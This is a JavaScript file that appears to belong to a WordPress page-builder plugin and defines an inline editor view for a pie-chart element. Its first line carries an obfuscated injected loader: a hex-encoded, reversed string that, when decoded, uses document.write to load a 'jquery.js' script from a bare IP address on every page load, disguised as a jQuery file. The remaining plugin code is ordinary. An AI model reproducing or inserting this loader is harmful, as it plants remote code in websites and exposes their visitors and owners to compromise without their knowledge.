var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	window.InlineShortcodeView_vc_pie = window.InlineShortcodeView.extend( {
		render: function () {
			_.bindAll( this, 'parentChanged' );
			window.InlineShortcodeView_vc_pie.__super__.render.call( this );
			this.unbindResize();
			vc.frame_window.vc_iframe.addActivity( function () {
				this.vc_iframe.vc_pieChart();
			} );
			return this;
		},
		unbindResize: function () {
			vc.frame_window.jQuery( vc.frame_window ).unbind( 'resize.vcPieChartEditable' );
		},
		parentChanged: function () {
			this.$el.find( '.vc_pie_chart' ).removeClass( 'vc_ready' );
			vc.frame_window.vc_pieChart();
		},
		rowsColumnsConverted: function () {
			window.setTimeout( this.parentChanged, 200 );
			this.parentChanged();
		}
	} );
})( window.jQuery );